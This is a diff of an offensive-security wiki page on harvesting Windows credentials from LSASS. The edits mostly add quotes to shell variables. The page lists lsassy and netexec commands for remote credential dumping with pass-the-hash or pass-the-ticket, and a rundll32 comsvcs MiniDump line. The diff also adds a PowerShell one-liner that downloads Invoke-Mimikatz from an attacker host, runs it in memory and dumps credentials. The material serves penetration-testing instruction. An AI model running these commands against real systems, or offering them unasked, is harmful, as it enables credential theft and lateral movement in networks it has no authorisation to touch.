@@ -19,25 +19,25 @@ The Local Security Authority Subsystem Service (LSASS) is a Windows service resp
 [Lsassy](https://github.com/Hackndo/lsassy) (Python) can be used to remotely extract credentials, from LSASS, on multiple hosts. As of today (22/07/2020), it is the Rolls-Royce of remote lsass credential harvesting.
 
 * several dumping methods: comsvcs.dll, [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [Dumpert](https://github.com/outflanknl/Dumpert)
-* several authentication methods: like [pass-the-hash](../../ntlm/pth.md) (NTLM), or [pass-the-ticket](../../kerberos/ptt.md) (Kerberos)
+* several authentication methods: like [pass-the-hash](../../ntlm/pth.md) (NTLM), or [pass-the-ticket](../../kerberos/pass-the/ptt.md) (Kerberos)
 * it can be used either as a standalone script, as a [NetExec](https://github.com/Pennyw0rth/NetExec) module or as a Python library
 * it can interact with a Neo4j database to set [BloodHound](https://github.com/BloodHoundAD/BloodHound) targets as "owned"
 
 ```bash
 # With pass-the-hash (NTLM)
-lsassy -u $USER -H $NThash $TARGETS
+lsassy -u "$USER" -H "$NT_HASH" "$TARGETS"
 
-# With plaintext credentials
-lsassy -d $DOMAIN -u $USER -H $NThash $TARGETS
+# With pass-the-hash and domain
+lsassy -d "$DOMAIN" -u "$USER" -H "$NT_HASH" "$TARGETS"
 
 # With pass-the-ticket (Kerberos)
-lsassy -k $TARGETS
+lsassy -k "$TARGETS"
 
 # netexec Module examples
-netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
-netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
-netexec smb $TARGETS -k -M lsassy
-netexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
+netexec smb "$TARGETS" -d "$DOMAIN" -u "$USER" -H "$NT_HASH" -M lsassy
+netexec smb "$TARGETS" -d "$DOMAIN" -u "$USER" -H "$NT_HASH" -M lsassy -o BLOODHOUND=True NEO4JUSER="neo4j" NEO4JPASS="Somepassw0rd"
+netexec smb "$TARGETS" -k -M lsassy
+netexec smb "$TARGETS" -k -M lsassy -o BLOODHOUND=True NEO4JUSER="neo4j" NEO4JPASS="Somepassw0rd"
 ```
 
 
@@ -106,7 +106,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)'s exfiltration script [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) (PowerShell) can be used to extract credential material from LSASS's process memory.
 
 ```bash
-powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
+powershell IEX (New-Object System.Net.Webclient).DownloadString("http://$ATTACKER_IP/Invoke-Mimikatz.ps1") ; Invoke-Mimikatz -DumpCreds
 ```
 
 :::
